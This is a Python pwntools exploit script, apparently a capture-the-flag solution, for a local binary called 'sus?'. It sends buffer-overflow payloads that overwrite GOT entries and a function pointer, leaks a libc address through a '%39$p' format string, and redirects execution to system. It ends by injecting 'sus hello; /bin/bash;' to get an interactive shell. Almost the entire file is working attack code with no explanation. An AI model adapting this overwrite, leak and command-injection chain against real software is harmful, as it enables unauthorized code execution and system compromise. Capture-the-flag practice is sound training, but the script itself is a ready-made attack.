from pwn import *

binary = 'sus?'
context.log_level = 'debug'

io = process(binary)

def ggdb():
    cmd = ""
    cmd += "#!/bin/sh\n"
    cmd += "gdb -p `pidof %s` -q "%(binary)
    # cmd += "-ex 'b *$rebase(0x0000000000014DB)' "
    # cmd += "-ex 'b *0x401AC0' "
    # cmd += "-ex 'b *0x40162B' "
    with open("./gdb.sh",'w') as f:
        f.write(cmd)
    os.system("chmod +x ./gdb.sh")
ggdb()

io.recvuntil(b'Looking for sus files...\n')

payload = b'A' * 0x2300
io.sendline(payload)
payload = b'B' * 0xb0
payload += p32(0x404048)
io.send(payload)

# set got['memset'] = retn
payload = b'A' * 8 + p32(0x401B9C)
io.send(payload)

payload = p32(0x4010c0)
io.send(payload)

payload = p32(0x4010d0)
io.send(payload)

# set got['exit'] = retn
payload = p32(0x401B9C)
io.send(payload)

payload = b'A' * 0x10 + b'\x00'
io.send(payload)

payload = b'B' * 0x2208
io.sendline(payload)
payload = b'E' * 0xf8
payload += p32(0x4040c8)
io.send(payload)


# hijack stdinOp->susfile_log = printf
elf = ELF(binary)
printf = elf.plt['printf']
payload = p32(printf)
io.send(payload)

payload = b'sus+++++|%39$p|'
io.sendline(payload)

io.recvuntil(b'|')
__libc_start_main = int(io.recvuntil(b'|')[:-1], 16) - 128
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = __libc_start_main - libc.sym['__libc_start_main']
info('libc base => 0x%x' % (libc.address))
io.recv()

payload = b'A' * 0x2300
io.sendline(payload)

payload = b'F' *0x58
payload += p32(0x4040c8)
io.send(payload)

payload = p64(libc.sym['system'])[:6]
io.sendline(payload)

payload = b'sus hello; /bin/bash; '
io.sendline(payload)

io.interactive()